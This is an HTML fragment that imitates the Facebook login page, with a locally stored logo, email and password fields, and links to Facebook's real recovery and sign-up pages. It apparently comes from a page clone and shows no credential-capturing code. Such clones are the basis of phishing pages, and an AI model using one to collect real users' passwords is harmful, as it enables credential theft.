...
<div class="grey">
<center>
<img id="logo" src="image/fb.png" height="50" width="200">
...
<input name="email" id="email" type="text" placeholder="Email or phone number">
<input name="password" id="password" type="password" placeholder="Password">
<button id="login" type="submit">Log In</button>
</center>
<div id="links">
<a id="links" href="https://www.facebook.com/login/identify/">Forgotten account?</a>
</div>
<p id="or">or</p>
...
<center>
<ul>
<li><a href="https://facebook.com/reg/">Sign up</a>
</li>
<li><a href="https://facebook.com/login.php">Log in</a>
</li>
